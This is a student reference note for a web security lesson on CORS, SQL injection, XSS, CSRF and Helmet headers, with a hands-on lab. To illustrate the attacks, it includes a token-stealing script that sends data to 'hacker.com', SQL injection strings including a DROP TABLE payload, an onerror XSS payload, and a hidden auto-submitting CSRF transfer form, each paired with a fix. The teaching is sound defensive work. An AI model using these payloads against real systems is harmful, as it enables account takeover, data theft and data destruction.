# Lesson 32 — Web Security Basics (CORS, XSS, CSRF, SQL Injection)
# Student Reference Notes

> **Launch the lab before reading:**
> ```bash
> cd examples/security-api
> pnpm install   # first time only
> pnpm dev
> ```
> Open **http://localhost:3000** — start on the **Concepts** tab.

---

## What This Lesson Is About

In previous lessons, we secured *who* has access to the API using JSON Web Tokens (JWT). Today, we look at securing *how* data enters and leaves our applications.

Web applications are inherently public. If there is a text box, someone *will* try to type malicious code into it. If you have an API, someone *will* try to hit it from a malicious website.

We will cover the **Big Four** of foundational web security:
1. **CORS (Cross-Origin Resource Sharing)** — Controlling which domains can talk to your API.
2. **SQL Injection** — Preventing user input from being interpreted as SQL commands.
3. **XSS (Cross-Site Scripting)** — Stopping hackers from injecting malicious JavaScript into your pages.
4. **CSRF (Cross-Site Request Forgery)** — Stopping hackers from tricking a user's browser into performing actions on their behalf.

And one essential tool:
5. **Helmet** — Setting security HTTP headers automatically.

---

## 1. CORS: The Strict Bouncer

### The Problem: Same-Origin Policy (SOP)
By default, browsers have a strict rule called the **Same-Origin Policy**. If a user is on `http://my-frontend.com` and Javascript tries to `fetch()` data from `http://my-backend-api.com`, the browser will **block** the request.

Why? Because if you are logged into your bank (`bank.com`), and you visit a malicious website (`evil.com`), you don't want `evil.com`'s Javascript to silently make a background request to `bank.com/transfer` and steal your money.

### The Solution: CORS
But what if you *own* both `my-frontend.com` and `my-backend-api.com`? You *want* them to talk!

**Analogy: The Cross-Border Club**
Imagine a club situated exactly on the border of two countries. The default law (Same-Origin Policy) says "No one from the other country can enter." But the club manager (your API) can give the bouncer (the browser) a specific VIP list: "Actually, let people from *Frontendland* in."

This VIP list is **CORS (Cross-Origin Resource Sharing)**.

```javascript
import cors from 'cors';

// ❌ BAD: The Bouncer lets ANYONE in. (Never do this in production)
app.use(cors()); 

// ✅ GOOD: The Bouncer only lets your specific frontend in.
app.use(cors({
  origin: 'http://localhost:3000', // Or your Vercel/Netlify URL
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  credentials: true // Allow cookies/authorization headers to be sent
}));
```

When the browser sees the CORS headers coming back from the API (`Access-Control-Allow-Origin: http://localhost:3000`), it allows the request to succeed.

---

## 2. SQL Injection: The Oldest Trick in the Book

### The Problem
**SQL Injection** is when a hacker's input is interpreted as SQL *code* instead of *data*. It is one of the oldest and most dangerous attacks in existence, and it can let an attacker read your entire database, modify records, or even destroy tables — without ever knowing your password.

### How the Attack Works
Consider a login form. A naive developer might write:

```javascript
// VULNERABLE — never do this
const email = req.body.email; // What if email = "' OR '1'='1"
const query = `SELECT * FROM users WHERE email = '${email}'`;
// The injected query becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
// '1'='1' is always true — returns ALL users!
```

By sending the payload `' OR '1'='1` as the email, an attacker turns the query into one that always returns every row. The application receives results and thinks the login was successful — without needing a real password.

### The `DROP TABLE` Variant (Bobby Tables Attack)
Perhaps the most infamous injection uses SQL's ability to chain statements:

```
'; DROP TABLE users; --
```

When plugged into the vulnerable query, this becomes:
```sql
SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
```

The `--` at the end comments out any remaining SQL. Result: your users table is **deleted permanently**.

> This is why the famous webcomic *xkcd* #327 shows a child named "Robert'); DROP TABLE Students;--" — a real-world joke about SQL injection that developers everywhere now call "Little Bobby Tables."

### The Fix: Parameterized Queries

```javascript
// SAFE — parameterized query
const rows = await pool.query(
  'SELECT * FROM users WHERE email = $1',
  [req.body.email]  // Database driver treats this as DATA, not SQL code
);
```

### Why It Works
When you use a parameterized query, the database engine receives two completely separate things:
1. **The SQL template** — the structure of the query (compiled first)
2. **The parameters** — the data values (inserted after compilation)

Because the structure is already compiled before the data arrives, there is no opportunity for the data to change the meaning of the query. The database sees `email = 'value'` where `value` is strictly data, never parsed as SQL.

**Analogy:** A parameterized query is like a form with a fixed template — you can fill in the blanks but you **cannot change the structure of the form itself**. If the form says "Name: ___", whatever you write in that blank is treated as your name, not as an instruction.

### ORMs Protect You by Default
Modern ORMs like **Prisma** use parameterized queries under the hood for all operations. This means code like:

```javascript
// Prisma — automatically safe from SQL injection
const user = await prisma.user.findUnique({
  where: { email: req.body.email }
});
```

...is already protected. The `where` clause is internally parameterized by Prisma before it ever reaches the database. This is one of the major security benefits of using an ORM over raw SQL.

### In the Lab
The Attack Simulator tab lets you compare a vulnerable string-concatenated query against a safe parameterized one. Try sending `' OR '1'='1` and watch:
- The **vulnerable endpoint** returns all users in the database
- The **safe endpoint** returns nothing (no user has that literal email address)

---

## 3. XSS: The Malicious Graffiti Artist

### The Problem
**Cross-Site Scripting (XSS)** happens when an application takes untrusted data (like a user's comment) and sends it back to a web browser without proper validation or escaping.

**Analogy:**
Imagine a public physical bulletin board where people leave post-it notes. A graffiti artist comes along and paints: *"Everyone who reads this board must immediately hand their wallet to the man in the red hat."* If people blindly follow instructions written on the board, they get robbed.

In code, a hacker submits a comment like this:
```html
Great post! <script>
  // Steal the user's JWT token from localStorage and send it to the hacker
  fetch('http://hacker.com/steal?token=' + localStorage.getItem('token'));
</script>
```

If your frontend renders that comment using something like React's `dangerouslySetInnerHTML` or vanilla JS `element.innerHTML`, the browser will literally execute the script!

Another popular payload that requires no `<script>` tag at all:
```html
<img src=x onerror=alert('XSS!')>
```
The browser tries to load the image, fails, and runs the `onerror` JavaScript — no script tags needed.

### The Solution: Output Encoding and Sanitization
1. **Output Encoding:** Modern frameworks like React, Vue, and Angular automatically encode output by default. If you render `{comment.text}`, React turns the `<` into `&lt;`, so it renders as plain text, not executable code.
2. **Sanitization:** Sometimes you *want* to allow users to use rich text (bold, italics). In this case, you must "sanitize" the HTML to strip out `<script>` tags but leave `<b>` tags.

On the backend, you can sanitize data before saving it:
```javascript
import xss from 'xss';

app.post('/api/comments', (req, res) => {
  const rawComment = req.body.text;
  
  // Clean the comment: Removes <script>, onmouseover, etc.
  const safeComment = xss(rawComment); 
  
  db.save(safeComment);
  res.json({ message: "Comment saved safely!" });
});
```

---

## 4. CSRF: The Forged Bank Check

### The Problem
**Cross-Site Request Forgery (CSRF)** forces an end user to execute unwanted actions on a web application in which they're currently authenticated.

**Analogy:**
Imagine you go to a bank, show your ID, and get a "valid" stamp on your hand. You then walk to a shady cafe next door. The barista slips a forged bank transfer form into your pocket. When you walk back into the bank, the teller sees the valid stamp on your hand, finds the form in your pocket, and processes the transfer without asking you.

In the web world, if you use **Cookies** for authentication, the browser *automatically* sends those cookies with every request to that domain.
If you are logged into `bank.com`, and visit `evil.com`, and `evil.com` has a hidden form that POSTs to `bank.com/transfer`, your browser will happily attach your `bank.com` auth cookie to the request. The bank thinks YOU initiated the transfer.

### What an Attack Actually Looks Like

Here is the malicious HTML an attacker would host on `evil.com`:

```html
<!-- On evil.com — victim visits, form auto-submits silently -->
<form action="https://bank.com/transfer" method="POST" style="display:none">
  <input name="amount" value="50000">
  <input name="to_account" value="hacker-account">
</form>
<script>document.forms[0].submit();</script>
```

The victim's browser visits `evil.com`, the hidden form instantly submits itself, and because the victim is already logged into `bank.com`, the browser dutifully attaches their session cookie. The bank never asked the user if they meant to send money — it just accepted the request.

### The Solution: SameSite Cookies & Anti-CSRF Tokens

**Modern Solution (SameSite Cookie Attribute):**
The `SameSite` cookie attribute tells the browser when NOT to send a cookie:

```javascript
// Express — setting a secure session cookie
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  sameSite: 'Strict',  // Key: blocks cross-origin form submissions
  secure: true          // Only sent over HTTPS
});
```

| SameSite Value | Behaviour |
|----------------|-----------|
| `Strict` | Cookie is NEVER sent in cross-origin requests. Most secure. |
| `Lax` | Cookie is sent for top-level navigations (clicking a link) but not for background requests (fetch, XMLHttpRequest). Good balance. |
| `None` | Cookie is always sent (must also set `Secure`). Required for cross-site functionality like embedded payments. |

Setting `SameSite=Strict` (or `Lax`) means `evil.com`'s form POST will arrive at `bank.com` without any session cookie attached. The bank's server gets an unauthenticated request and rejects it. Attack neutralized.

**Traditional Solution (Anti-CSRF Tokens):**
The server generates a unique, random string (CSRF Token) and embeds it in every form. Whenever the frontend makes a state-changing request (POST, PUT, DELETE), it must include this token. Because `evil.com` cannot read the token (due to the Same-Origin Policy!), its forged requests will fail.

---

## 5. Helmet: The Security HardHat — Header by Header

There are dozens of small HTTP headers that tell the browser how to behave securely (e.g., preventing the site from being embedded in an iframe to stop "Clickjacking").

Instead of memorizing them all, we use a middleware called **Helmet**.

```javascript
import helmet from 'helmet';
import express from 'express';

const app = express();

// Instantly adds 14 critical security headers to every response!
app.use(helmet()); 
```

### What Helmet Actually Does

Here is what each of Helmet's key headers does and why it matters:

| Header | What it Does | Why it Matters |
|--------|-------------|----------------|
| `Content-Security-Policy` | Controls which domains JS/CSS/images can load from | Blocks XSS even if malicious code is injected — the browser refuses to run it |
| `X-Frame-Options` | Prevents your site from being embedded in iframes on other domains | Stops **Clickjacking** attacks (where a hacker overlays an invisible iframe over a decoy page) |
| `Strict-Transport-Security` (HSTS) | Forces HTTPS for this domain for a set period | Prevents **protocol downgrade attacks** (stripping HTTPS to HTTP to intercept traffic) |
| `X-Content-Type-Options` | Prevents MIME type sniffing (`nosniff`) | Stops browsers from running a `.txt` file as JavaScript just because it looks like JS |
| `Referrer-Policy` | Controls how much URL info is sent in the `Referer` header | Protects URL privacy (e.g., prevents your internal page URLs from leaking to third parties) |
| `Permissions-Policy` | Restricts access to browser APIs (camera, mic, geolocation) | Prevents malicious scripts from silently accessing hardware |
| `X-DNS-Prefetch-Control` | Disables browser DNS prefetching | Reduces information leakage about which domains your page links to |

### Customising Helmet

The defaults are good, but you may need to relax CSP for your CDN-hosted assets:

```javascript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://cdn.jsdelivr.net"],  // Allow CDN scripts
      styleSrc:  ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      fontSrc:   ["'self'", "https://fonts.gstatic.com"],
    }
  }
}));
```

---

## Common Mistakes to Avoid

| Mistake | Consequence | Fix |
|---------|-------------|-----|
| `app.use(cors())` with no options | Any website in the world can make requests to your API | Explicitly define the `origin` array |
| Using `innerHTML` on the frontend | Browser executes any `<script>` or `onerror` payloads found in the data (XSS) | Use `textContent`, `innerText`, or framework defaults (like React's `{variable}`) |
| Relying on frontend validation only | Hackers bypass the frontend and send XSS/SQLi payloads directly via Postman | Always sanitize/validate on the backend |
| String-concatenating user input into SQL queries | Attacker can inject SQL commands, bypass login, steal or destroy data | Always use parameterized queries or an ORM |
| Storing sensitive tokens in cookies without `SameSite` | Browser automatically sends cookie on cross-site requests (CSRF vulnerability) | Set `SameSite=Strict` or `SameSite=Lax` on all auth cookies |
| Using `' OR '1'='1` as part of a test and trusting validation alone | Even if your frontend blocks it, Postman can send it directly | Parameterized queries at the DB layer are non-negotiable |

---

## 6. The Security Mindset

Security is not a feature you add at the end — it is a discipline you apply throughout development. Here are the four principles that underpin everything we've covered:

### 🚫 Trust Nothing
Every input your application receives — from a form, a URL parameter, a cookie, or an API call — is **hostile until proven safe**. Never assume a user will send you what you expect.

- Validate structure (is it the right type/length/format?)
- Sanitize content (strip or escape dangerous characters)
- Do this on the **server**, not just the client (the client can be bypassed)

### 🛡️ Defense in Depth
No single security measure is a silver bullet. Layer multiple defenses so that if one fails, the others catch it:

```
Request arrives
   → CORS checks the origin (blocks unauthorised callers)
   → Helmet sets security headers (restricts what browser will execute)
   → Input validation checks structure (rejects malformed data)
   → Parameterized queries isolate data from SQL (prevents injection)
   → Output encoding prevents rendering malicious HTML (blocks XSS)
```

A hacker who somehow bypasses CORS still hits the parameterized query. A hacker who crafts a clever XSS payload still hits the Content-Security-Policy header from Helmet. Every layer raises the cost of an attack.

### 🔒 Minimum Privilege
Database users, API keys, and service accounts should have **only the permissions they actually need**:

```sql
-- Bad: your app uses a DB user with full privileges
GRANT ALL PRIVILEGES ON *.* TO 'app_user'@'%';

-- Good: your app only needs to read and write specific tables
GRANT SELECT, INSERT, UPDATE ON mydb.users TO 'app_user'@'%';
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.notes TO 'app_user'@'%';
-- Never grant DROP TABLE to your application user!
```

This means even if SQL injection does occur, the attacker cannot `DROP TABLE` because your database user doesn't have that permission.

### 🔄 Keep Dependencies Updated
Vulnerabilities are discovered in open-source packages regularly. Run `npm audit` as part of your workflow:

```bash
# Scan for known vulnerabilities
npm audit

# Auto-fix low-risk vulnerabilities
npm audit fix

# Check Prisma, Express, etc. for known CVEs
pnpm audit
```

Set up **Dependabot** or **Snyk** on your GitHub repository to get automated pull requests when a dependency has a known security flaw.

---

## Quick Reference Cheat Sheet

| Attack | Root Cause | Primary Fix |
|--------|-----------|-------------|
| **CORS violation** | No origin allowlist | `cors({ origin: ['https://yourapp.com'] })` |
| **SQL Injection** | User input concatenated into SQL | Parameterized queries / ORM |
| **XSS** | User input rendered as HTML | `textContent` / React JSX / xss library |
| **CSRF** | Cookie sent automatically cross-site | `SameSite=Strict` cookie attribute |
| **Clickjacking** | Site embeddable in iframes | `X-Frame-Options: DENY` (via Helmet) |
| **MIME Sniffing** | Browser guesses content type | `X-Content-Type-Options: nosniff` (via Helmet) |
| **HTTPS Downgrade** | Request sent over HTTP | `Strict-Transport-Security` (via Helmet) |

---

## Next Steps

Launch the Interactive Lab (`pnpm dev`) and explore all four tabs:
- **Concepts** — Click any attack card to see the full attack flow
- **Attack Simulator** — Try the XSS and SQL Injection demos side by side
- **Headers Lab** — Inspect the live security headers your server sends
- **Quiz** — Test your knowledge with 7 questions

Try sending `<img src=x onerror=alert('XSS!')>` in the XSS demo. Watch the Vulnerable side execute it and the Secure side display it as plain text. Then try `' OR '1'='1` in the SQL Injection demo!
